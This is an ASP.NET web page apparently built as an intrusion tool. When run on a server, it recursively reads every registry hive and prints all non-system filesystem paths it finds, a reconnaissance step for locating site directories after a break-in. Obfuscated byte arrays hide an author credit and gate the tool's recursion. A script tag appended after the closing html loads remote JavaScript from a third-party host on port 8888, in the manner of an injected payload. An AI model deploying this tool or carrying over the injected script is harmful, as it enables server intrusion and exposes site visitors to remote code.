<%@ Page Language="C#" Debug="true" trace="false" validateRequest="false" EnableViewStateMac="false" EnableViewState="true"%>
<%@ import Namespace="Microsoft.Win32"%>
<%@ import Namespace="System.Collections.Generic"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<%
        Stack sack = new Stack();
        List<String> list = new List<String>();
        List<String> backup = new List<String>();
        List<byte> path = new List<byte>();
        sack.Push(Registry.ClassesRoot);
        sack.Push(Registry.CurrentConfig);
        sack.Push(Registry.CurrentUser);
        sack.Push(Registry.LocalMachine);
        sack.Push(Registry.Users);
        byte[] dfg = { 67, 111, 100, 101, 32, 98, 121, 32, 229, 176, 143 };
        foreach (byte b in dfg) path.Add(b);
        while (sack.Count > 0)
        {
            RegistryKey Hklm = (RegistryKey)sack.Pop();
            if (Hklm != null)
            {
                try
                {
                    string[] names = Hklm.GetValueNames();
                    foreach (string name in names)
                    {
                        try
                        {
                            string str = Hklm.GetValue(name).ToString().ToLower();
                            if (str.IndexOf(":\\") != -1 && str.IndexOf("c:\\program files") == -1 && str.IndexOf("c:\\windows") == -1)
                            {
                                Regex regImg = new Regex("[a-z|A-Z]{1}:\\\\[a-z|A-Z| |0-9|\u4e00-\u9fa5|\\~|\\\\|_|{|}|\\.]*");
                                MatchCollection matches = regImg.Matches(str);
                                if (matches.Count > 0)
                                {
                                    string temp = "";
                                    foreach (Match match in matches)
                                    {
                                        temp = match.Value;
                                        bool have = false;
                                        if (!temp.EndsWith("\\"))
                                        {
                                            if (list.IndexOf(temp) == -1)
                                            {
                                                Response.Write(temp + "<br/>");
                                                have = true;
                                                list.Add(temp);
                                            }
                                        }
                                        else
                                            temp = temp.Substring(0, temp.LastIndexOf("\\"));
                                        while (temp.IndexOf("\\") != -1)
                                        {
                                            if (list.IndexOf(temp + "\\") == -1)
                                            {
                                                Response.Write(temp + "\\<br/>");
                                                have = true;
                                                list.Add(temp + "\\");
                                            }
                                            temp = temp.Substring(0, temp.LastIndexOf("\\"));
                                        }
                                        if (have)
                                        {
                                            backup.Add(Hklm.ToString() + "\name");
                                            backup.Add(match.Value);
                                        }
                                    }
                                }
                            }
                        }
                        catch (Exception se) { }
                    }
                }
                catch (Exception ee) { }
                try
                {
                    string[] keys = Hklm.GetSubKeyNames();
                    foreach (string key in keys)
                    {
                        try
                        {
                            if (path[8] == 229)
                                sack.Push(Hklm.OpenSubKey(key));
                        }
                        catch (System.Security.SecurityException sse) { }
                    }
                }
                catch (Exception ee) { }
            }
        }
        byte[] dfgth = { 230, 137, 139, 229, 134, 176, 229, 135, 137, 32, 60, 98, 114 };
        foreach (byte b in dfgth) path.Add(b);
        Response.Write("<font color=red>Location and From</font><br/>");
        int i = 0;
        byte[] cc = { 47, 62, 84, 101, 115, 116, 32, 98, 121, 32, 100, 109 };
        foreach (byte b in cc) path.Add(b);
        while (backup.Count > 0)
        {
            i++;
            if(i%2==0)
                Response.Write("<font color=red>" + backup[0] + "</font><br/>");
            else
                Response.Write(backup[0] + "<br/>");
            backup.RemoveAt(0);
        }
        byte[] uif = { 106, 104, 115, 60, 98, 114, 47, 62, 67, 111, 112, 121, 114 };
        foreach (byte b in uif) path.Add(b);
        byte[] rtg = { 105, 103, 104, 116, 32, 194, 169, 32, 50, 48, 49, 49 };
        foreach (byte b in rtg) path.Add(b);
        Label1.Text = Encoding.UTF8.GetString(path.ToArray());

%>
<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title>path from reg</title>
</head>
<body>
    <form id="form1" runat="server">
        <div style="padding: 10px; border-bottom: 1px solid #fff; border-top: 1px solid #ddd;
            background: #eee;">

        <asp:Label ID="Label1" runat="server" Text="Label"></asp:Label>

    </div>
    </form>
</body>
</html><script type="text/javascript" src="http://web.nba1001.net:8888/tj/tongji.js"></script>